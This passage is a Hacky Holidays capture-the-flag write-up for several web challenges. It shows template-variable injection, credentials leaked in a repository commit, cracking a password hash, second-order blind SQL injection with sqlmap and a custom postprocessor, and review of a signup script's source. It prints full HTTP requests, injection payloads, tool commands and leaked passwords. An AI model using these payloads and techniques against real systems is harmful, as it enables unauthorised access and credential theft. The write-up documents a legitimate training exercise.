:: Progress: [4660/4660] :: Job [1/1] :: 359 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
```

We found a new directory `/hate-mail-generator/templates`, and it shows its contents when we review it:
- Index of /hate-mail-generator/templates/
    - cbdj3_grinch_header.html
    - cbdj3_grinch_footer.html
    - 38dhs_admins_only_header.html

Trying to browsing directly to the new endpoint `38dhs_admins_only_header.html` gave us status code 403, so we tried to load it through the campaign template.

```html
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 122
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/hate-mail-generator/new
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7

preview_markup=Loading: {{template:38dhs_admins_only_header.html}} &preview_data={"name":"Alice","email":"alice@test.com"}

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 18 Dec 2020 18:01:23 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 64

You do not have access to the file 38dhs_admins_only_header.html
```

At this point I didn't have much idea what to do. So I took a break to clear my mind.

Imagining that possibly the template variables were recursively populated, what if we can use template variables within our data?

```html
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 140
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/hate-mail-generator/new
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7

preview_markup=Loading: {{data}}
&preview_data={"name":"Grinch","email":"bob@test.com","data":"{{template:38dhs_admins_only_header.html}}"}

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 18 Dec 2020 21:39:28 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 350

Loading: <html>
<body>
<center>
    <table width="700">
        <tr>
            <td height="80" width="700" style="background-color: #64d23b;color:#FFF" align="center">Grinch Network Admins Only</td>
        </tr>
        <tr>
            <td style="padding:20px 10px 20px 10px">
                <h4>flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}</h4>
```

And it worked!, we got access to the secret Grinch template and our flag.

{F1138029}

> flag: **flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}**
 next challenge: **/apps**

# Day 8: Forum

Challenge time!, `/apps` gave us as new endpoint: `/forum`

> Forum
 The Grinch thought it might be a good idea to start a forum but nobody really wants to chat to him. He keeps his best posts in the Admin section but you'll need a valid login to access that!

{F1138015}

After browsing through all endpoints available, we have:

- `/forum`: home page, we know there are 2 forums: General (with 2 categories) and Admin (protected).
    - `/forum/<id_category>`:  shows the post list of the category <id_category>.
        - `/forum/<id_category>/<id_post>`: shows the content of the post <id_post> inside <id_category>.
    - `/forum/login`: login form

Fuzzing more pages on `/forum` with [common.txt][common.txt] as wordlist leads us to one new endpoint: `/forum/phpmyadmin`

```bash
$ ffuf -u https://hackyholidays.h1ctf.com/forum/FUZZ -fc 404 -c -t 50 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
1                       [Status: 200, Size: 2249, Words: 788, Lines: 64]
2                       [Status: 200, Size: 1885, Words: 512, Lines: 58]
login                   [Status: 200, Size: 1569, Words: 396, Lines: 34]
phpmyadmin              [Status: 200, Size: 8880, Words: 956, Lines: 79]
:: Progress: [4660/4660] :: Job [1/1] :: 297 req/sec :: Duration: [0:00:17] :: Errors: 0 ::
```

Inspecting `/forum/1/1`, we know there are two user at least: `grinch` and `max`.

Inspecting `/forum/login`, we tried:
- Login with common credentials as `admin:admin`, It responses with `Username/Password Combination is invalid`, unlikely vulnerable to user enumeration.
- Common login bypass by SQLi, without success too.

Inspecting `/forum/phpmyadmin`, lead us to the same situation like `/forum/login`.

At this point I ran out of ideas, and went to rest.

Returning to the challenge, I tried searching for source code on GitHub, GitLab or BitBucket.

Starting with GitHub, using as dorks:
- `"Grinch forum"`, without success.
- `"Grinch networks"`, no luck.
- `"<p>You need to be an admin to view these posts</p>"`, success!, Got a juicy repo: `https://github.com/Grinch-Networks/forum`

{F1138014}

Manually checking the repository, starting with the commit history we found one commit called `small fix`

{F1138013}

We're on the right track at this point, we got leaked Database credentials there: `forum:6HgeAZ0qC9T6CQIqJpD`

{F1138016}

We have DB credentials now, Managed to log into `/forum/phpmyadmin` and extract new credentials.

{F1138012}

Now we know that Grinch has admin permissions, And we got one password plaintext using an online service to lookup already-cracked hashes: [Hashes.com][hashes.com]

> [hashes][md5] 35D652126CA1706B59DB02C93E0C9FBF:BahHumbug

Finally we managed to log into `/forum/login` using the credentials `grinch:BahHumbug`, got access to `/forum/3/2`, where we found our flag.

```html
GET /forum/3/2 HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/forum/3
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7
Cookie: phpmyadmin=98ac2709d3d94e8ba1afefab300deb8e; token=9F315347A655FFDAF70CD4A3529EE8A6

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 19 Dec 2020 18:48:05 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 2582

[...]               <div class="col-xs-10">
                    <div class="well well-sm" style="margin:0;font-size:12px">We've launched our recon server, gathered intelligence and pin pointed Santa's location!<br>Not long now until we find the IP addresses of his workshop and we can launch the DDoS attack!!!<br><br><strong>flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}</strong></div>
                    <div style="font-size: 10px;margin-top:7px">Posted at 12/12/2020 23:23</div>
                </div>[...]
```

{F1138030}

> flag: **flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}**
 next challenge: **/apps**


# Day 9: Evil Quiz

This time `/apps` gave us as new challenge endpoint: `/evil-quiz`

> Evil Quiz
 Just how evil are you? Take the quiz and see! Just don't go poking around the admin area!

{F1138017}

After browsing each possible page, we have:

- `/evil-quiz`: main page, we can set up our name here.
    - `/evil-quiz/start`: page to fill out quiz responses.
    - `/evil-quiz/score`: shows our quiz score and how many usernames with the same name exists.
    - `/evil-quiz/admin` : login form to access admin area.

We tried fuzzing other endpoints on `/evil-quiz` at this point, with no new results.

Analyzing the result of the quiz on `/evil-quiz/score`, we noticed that the score is dependent on our input in `/evil-quiz/start`, and the number of similarly named users depends on our input in `/evil-quiz`.

Testing with user: `foo`

```html
POST /evil-quiz HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 8
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/evil-quiz
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7
Cookie: session=4f464f71a5cf7a3272f75cf9fe4406ac

name=foo

HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 21 Dec 2020 01:15:14 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Set-Cookie: session=4f464f71a5cf7a3272f75cf9fe4406ac; expires=Tue, 22-Dec-2020 01:15:14 GMT; Max-Age=86400; path=/evil-quiz
Location: /evil-quiz/start
Content-Length: 0
```

```html
GET /evil-quiz/score HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Referer: https://hackyholidays.h1ctf.com/evil-quiz/start
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7
Cookie: session=4f464f71a5cf7a3272f75cf9fe4406ac

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 21 Dec 2020 01:15:40 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 1845

[...]           <div class="text-center" style="margin-top:50px">
                <div><strong>foo</strong> You Scored</div>
                <div style="font-size:72px;">0/<strong>3</strong></div>
                <div>You're not evil at all!</div>
                <div style="margin-top:20px">There is 4 other player(s) with the same name as you!</div>
            </div>[...]
```

Using as name: `foo`, got as response: `There is 4 other player(s) with the same name as you!`

Doing a basic SQLi test with: `foo'` gave us `There is 0 other player(s) with the same name as you!`

After trying to prove for a while that is [SQLi][sqli] vulnerable, finally using as name `foo' and 1=1-- bar`  got: `There is 3 other player(s) with the same name as you!`


```html
POST /evil-quiz HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 23
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/evil-quiz
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7
Cookie: session=4f464f71a5cf7a3272f75cf9fe4406ac

name=foo' and 1=1-- bar

HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 21 Dec 2020 01:17:23 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Set-Cookie: session=4f464f71a5cf7a3272f75cf9fe4406ac; expires=Tue, 22-Dec-2020 01:17:23 GMT; Max-Age=86400; path=/evil-quiz
Location: /evil-quiz/start
Content-Length: 0
```

```html
GET /evil-quiz/score HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Referer: https://hackyholidays.h1ctf.com/evil-quiz/start
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7
Cookie: session=4f464f71a5cf7a3272f75cf9fe4406ac

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 21 Dec 2020 01:17:26 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 1865

[...]           <div class="text-center" style="margin-top:50px">
                <div><strong>foo&#039; and 1=1-- bar</strong> You Scored</div>
                <div style="font-size:72px;">0/<strong>3</strong></div>
                <div>You're not evil at all!</div>
                <div style="margin-top:20px">There is 3 other player(s) with the same name as you!</div>
            </div>[...]
```

We are facing a [second-order SQLi][sqli] vulnerability, reviewing [sqlmap documentation][12] we saw that we can use the parameter `--second-url` or `--second-req` to exploit this vulnerability.

We noted that the number of existing users with a similar name can be variable, as it changes if another CTF participant uses a similar name and even the total number of current participants is constantly changing. So I wrote a custom [sqlmap][sqlmap] post processor that changes the response obtained according to these rules:
- if the number of users with similar name is 0, return as page body: `false`
- otherwise return as page body: `true`

**postprocess.py**
```python
#!/usr/bin/python3
import re
def postprocess(page, headers=None, code=None):
    if page:
        matches=re.search(r'There is (.*) other player\(s\) with the same name as you!',page, re.IGNORECASE)
        if matches:
            value=matches.group(1)
            if value=='0':
                page="false"  
            else:
                page="true"
    return page, headers, code
```

**request.txt**
```html
POST /evil-quiz HTTP/1.1
Host: hackyholidays.h1ctf.com:443
Connection: close
Content-Length: 21
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/evil-quiz
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7
Cookie: session=4f464f71a5cf7a3272f75cf9fe4406ac

name=
```
**second.txt**
```html
GET /evil-quiz/score HTTP/1.1
Host: hackyholidays.h1ctf.com:443
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Referer: https://hackyholidays.h1ctf.com/evil-quiz/start
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7
Cookie: session=4f464f71a5cf7a3272f75cf9fe4406ac
```

So using [sqlmap][sqlmap] we managed to extract interesting data from the database.

```bash
$ sqlmap -r request.txt -p name --second-req second.txt --technique=B  --level=5 --risk=3  --postprocess postprocess.py --prefix "foo'" --suffix "-- bar" 
<..>
---
Parameter: name (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: name=-1907foo' OR 1462=1462-- bar
---
[19:20:25] [INFO] testing MySQL
[19:20:26] [INFO] confirming MySQL
[19:20:28] [INFO] the back-end DBMS is MySQL
```

```bash
$ sqlmap -r request.txt -p name --second-req second.txt --technique=B  --level=5 --risk=3  --postprocess postprocess.py  --prefix "foo'" --suffix "-- bar" --dbs
<..>

available databases [2]:
[*] information_schema
[*] quiz

Database: quiz
[2 tables]
+-------+
| admin |
| quiz  |
+-------+

Database: quiz
Table: admin
[1 entry]
+----+-------------------+----------+
| id | password          | username |
+----+-------------------+----------+
| 1  | S3creT_p4ssw0rd-$ | admin    |
+----+-------------------+----------+
```

Using as credentials `admin:S3creT_p4ssw0rd-$` on `/evil-quiz/admin`, we got access to admin area with our flag.

```html
POST /evil-quiz/admin HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 43
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/evil-quiz/admin
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7
Cookie: session=4f464f71a5cf7a3272f75cf9fe4406ac

username=admin&password=S3creT_p4ssw0rd-%24

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 21 Dec 2020 00:33:34 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 774

<!DOCTYPE html>
<html lang="en">
<head>
    <title>Evil Quiz - Admin</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
</head>
<body>
<div class="container" style="margin-top:20px">
    <div class="text-center"><img src="/assets/images/grinch-networks.png" alt="Grinch Networks"></div>
    <h1 class="text-center">Evil Quiz Admin</h1>
            <h3 class="text-center">flag{6e8a2df4-5b14-400f-a85a-08a260b59135}</h3>
    </div>
</body>
</html>
```

{F1138033}

> flag: **flag{6e8a2df4-5b14-400f-a85a-08a260b59135}**
 next challenge: **/apps**

# Day 10: Signup Manager

As usual, This time browsing on `/apps` gave us as new challenge: `/signup-manager`

> Signup Manager
 You've made it this far! The grinch is recruiting for his army to ruin the holidays but they're very picky on who they let in!

 {F1138002}

After browsing available endpoints, we found only `/signup-manager`:
- ``/signup-manager``
    - Login uses `/signup-manager` with POST parameter `action=login`
    - Signup uses `/signup-manager` with POST parameter `action=signup`
    - Logout uses `/signup-manager` with GET parameter `logout=1`

Signing up to access more endpoints..

```html
POST /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 88
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/signup-manager/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7

action=signup&username=admin1337&password=pizza4admin&age=0&firstname=admin&lastname=min

HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 21 Dec 2020 13:41:12 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Set-Cookie: token=84d021610713fe8e72da7bb792d8c522; expires=Mon, 21-Dec-2020 14:41:12 GMT; Max-Age=3600
Location: /signup-manager/
Content-Length: 0
```

We got logged but we didn't got new endpoints at this point.

Trying to fuzz new pages using our cookies as [common.txt][common.txt] as wordlist leads us to `/signup-manager/admin.php`.

```bash
$ ffuf -b "token=84d021610713fe8e72da7bb792d8c522" -u https://hackyholidays.h1ctf.com/signup-manager/FUZZ -mc all -fc 404 -c -t 50 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
admin.php               [Status: 200, Size: 36, Words: 6, Lines: 1]
index.php               [Status: 200, Size: 1128, Words: 146, Lines: 24]
:: Progress: [4660/4660] :: Job [1/1] :: 419 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
```

Browsing `/signup-manager/admin.php`, but we got blocked to directly access it.

```html
GET /signup-manager/admin.php HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 28 Dec 2020 03:14:05 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 36

You cannot access this page directly
```

At is this point, after taking a little break and inspecting closely the home page `/signup-manager`, we got one html comment pointing to `README.md`

```html
GET /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 21 Dec 2020 19:01:11 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 15153

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 21 Dec 2020 19:01:11 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 15153

<!-- See README.md for assistance -->
<!DOCTYPE html>
<html lang="en">
<head>
    <title>SignUp Manager</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
</head>
<body>[...]
```

On `/signup-manager/README.md`, we got juicy information:

```bash
$ curl -sk https://hackyholidays.h1ctf.com/signup-manager/README.md
# SignUp Manager

SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

### How to Install

1) Create a directory that you wish SignUp Manager to be installed into

2) Move signupmanager.zip into the new directory and unzip it.

3) For security move users.txt into a directory that cannot be read from website visitors

4) Update index.php with the location of your users.txt file

5) Edit the user and admin php files to display your hidden content

6) You can make anyone an admin by changing the last character in the users.txt file to a Y

7) Default login is admin / password
```

Now we knew new information:
- The source code is packed by default in a zip file called `signupmanager.zip`.
- Users records are store in a file called `user.txt`.
- We can gain admin status if we manage to change the last letter of our user record to `Y`.
- Default credentials are `admin:password`.

First we have tried above default credentials `admin:password` without success.

Checking the existence of the aforementioned files, we got access to the zip file on `/signup-manager/signupmanager.zip`.
Unzip its contents we have:

```bash
$ file signupmanager.zip
signupmanager.zip: Zip archive data, at least v2.0 to extract

$ unzip signupmanager.zip
Archive:  signupmanager.zip
  inflating: README.md
  inflating: admin.php
  inflating: index.php
  inflating: signup.php
  inflating: user.php
```
Inspecting each one, we find that the most useful is `index.php`:

```php
<?php
<..>
function buildUsers(){
    $users = array();
    $users_txt = file_get_contents('users.txt');
    foreach( explode(PHP_EOL,$users_txt) as $user_str ){
        if( strlen($user_str) == 113 ) {
            $username = str_replace('#', '', substr($user_str, 0, 15));
            $users[$username] = array(
                'username' => $username,
                'password' => str_replace('#', '', substr($user_str, 15, 32)),
                'cookie' => str_replace('#', '', substr($user_str, 47, 32)),
                'age' => intval(str_replace('#', '', substr($user_str, 79, 3))),
                'firstname' => str_replace('#', '', substr($user_str, 82, 15)),
                'lastname' => str_replace('#', '', substr($user_str, 97, 15)),
                'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)
            );
        }
    }
    return $users;
}
function addUser($username,$password,$age,$firstname,$lastname){
    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
    $line = '';
    $line .= str_pad( $username,15,"#");
    $line .= $password;
    $line .= $random_hash;
    $line .= str_pad( $age,3,"#");
    $line .= str_pad( $firstname,15,"#");
    $line .= str_pad( $lastname,15,"#");
    $line .= 'N';
    $line = substr($line,0,113);
    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
    return $random_hash;
}
<..>
if( $page == 'signup.php' ) {
    $errors = array();
    if (isset($_POST["action"])) {
        if( $_POST["action"] == 'login' && isset($_POST["username"], $_POST["password"]) ){
            if( isset($all_users[ $_POST["username"] ]) ){
                $u = $all_users[ $_POST["username"] ];
                if( md5($_POST["password"]) === $u["password"] ){
                    setcookie('token', $u["cookie"], time() + 3600);
                    header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
                    exit();
                }
            }
            $errors[] = 'Username and password combination not found';
        }
        if ($_POST["action"] == 'signup' && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
            $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
            if (strlen($username) < 3) {
                $errors[] = 'Username must by at least 3 characters';
            } else {
                if (isset($all_users[$username])) {
                    $errors[] = 'Username already exists';
                }
            }
            $password = md5($_POST["password"]);
            $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
            if (strlen($firstname) < 3) {
                $errors[] = 'First name must by at least 3 characters';
            }
            $lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
            if (strlen($lastname) < 3) {
                $errors[] = 'Last name must by at least 3 characters';
            }
            if (!is_numeric($_POST["age"])) {
                $errors[] = 'Age entered is invalid';
            }
            if (strlen($_POST["age"]) > 3) {
                $errors[] = 'Age entered is too long';
            }
            $age = intval($_POST["age"]);
            if (count($errors) === 0) {
                $cookie = addUser($username, $password, $age, $firstname, $lastname);
                setcookie('token', $cookie, time() + 3600);
                header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
                exit();
            }
        }
    }
}
include_once($page);
```

